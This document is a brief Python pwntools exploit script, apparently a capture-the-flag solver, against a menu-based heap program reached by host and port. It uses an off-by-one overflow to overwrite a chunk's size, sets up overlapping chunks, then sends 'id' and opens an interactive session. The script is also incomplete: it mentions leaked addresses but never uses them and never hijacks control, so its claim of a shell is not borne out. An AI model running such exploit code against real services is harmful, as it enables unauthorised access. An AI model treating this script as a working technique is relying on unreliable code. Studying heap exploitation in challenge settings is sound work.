#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'debug'

def pwn(host, port):
    io = remote(host, port)
    
    # Get leaked addresses
    banner = io.recvuntil(b'>', timeout=5)
    print(banner.decode(errors='ignore'))
    
    # Helper functions
    def c(sz, data):
        io.sendlineafter(b'>', b'1')
        io.sendlineafter(b':', str(sz).encode())
        io.sendlineafter(b':', data)
    
    def e(i, data):
        io.sendlineafter(b'>', b'2')
        io.sendlineafter(b':', str(i).encode())
        io.sendlineafter(b':', data)
    
    def d(i):
        io.sendlineafter(b'>', b'3')
        io.sendlineafter(b':', str(i).encode())
    
    def s(i):
        io.sendlineafter(b'>', b'4')
        io.sendlineafter(b':', str(i).encode())
        return io.recvuntil(b'>', timeout=1)
    
    # Exploit
    c(0x88, b'A'*0x80)
    c(0x88, b'B'*0x80)
    c(0x88, b'C'*0x80)
    
    e(0, b'X'*0x88 + b'\x91')
    d(1)
    c(0x48, b'Y'*0x40)
    
    io.sendline(b'id')
    io.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        pwn(sys.argv[1], int(sys.argv[2]))
    else:
        print("Usage: python final_pwn_solver.py <host> <port>")
